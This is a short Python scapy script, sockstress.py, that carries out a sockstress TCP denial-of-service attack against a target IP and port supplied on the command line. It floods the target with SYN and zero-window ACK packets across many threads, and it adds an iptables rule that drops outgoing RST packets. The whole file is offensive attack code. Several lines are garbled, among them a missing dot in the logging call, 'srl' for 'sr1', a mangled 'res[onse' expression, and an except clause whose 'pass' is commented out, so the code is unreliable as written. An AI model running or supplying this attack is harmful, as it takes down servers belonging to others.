from scapy.all import *
from time import sleep
import _thread
import logging
import os 
import signal 
import sys 
logging.getLogger("scapy.runtimes")setLevel(logging.ERROR)

if len(sys.argv) != 4:
	print("Usage: ./sockstress.py [Target IP] [Port] [Threads]")
	print("e.g.: ./sockstress.py 1.1.1.1 21 20") #Make sure the Port is open
	sys.exit()

target = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

def sockstress(target, port):
	while 0==0:
		try:
			x = random.randint(0, 65535)
			response = srl(IP(dst = target)/TCP(sport = x, dport = port, flags = 'S'), timeout = 1, verbose = 0)
			send(IP(dst = target)/ TCP(dport = port, sport = x, window = 0, flags = 'A', ack = (res[onse[TCP].seq + 1))/'\x00\x00', verbose = 0)
		except:
#attack stop			pass
def shutdown(signal, frame):
	print("recover iptables rules")
	os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -d " + target + " -j DROP")
	sys.exit()

#append iptables rule
os.system("iptables -A OUTPUT -p --tcp-flags RST RST -d "+ target +" -j DROP")
signal.signal(signal.SIGINT, shutdown)

print("Attacking...Press Ctrl+C to stop")
for x in range(0,threads):
	_thread.start_new_thread(sockstress, (target,port))
while 0==0:
	sleep(1)
 